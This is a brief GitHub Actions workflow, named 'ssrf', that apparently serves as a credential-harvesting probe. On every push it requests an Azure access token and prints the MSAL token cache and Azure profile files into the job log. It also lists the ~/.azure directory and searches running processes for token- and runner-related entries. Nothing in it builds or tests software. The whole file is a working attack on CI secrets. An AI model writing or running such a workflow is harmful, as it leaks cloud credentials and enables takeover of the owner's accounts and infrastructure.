name: ssrf
on: [push]
permissions:
  id-token: write
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: azure cli
        run: |
          echo "=== AZURE CLI ==="
          az version 2>/dev/null || echo "no az"
          az account show 2>/dev/null || echo "no account"
          az account get-access-token 2>/dev/null || echo "no token"
          
          echo "=== AZURE CONFIG ==="
          cat ~/.azure/msal_token_cache.json 2>/dev/null || echo "no cache"
          cat ~/.azure/azureProfile.json 2>/dev/null || echo "no profile"
          ls ~/.azure/ 2>/dev/null || echo "no azure dir"
          
          echo "=== PROCESS LIST ==="
          ps aux | grep -i "azure\|github\|runner\|token" | head -10
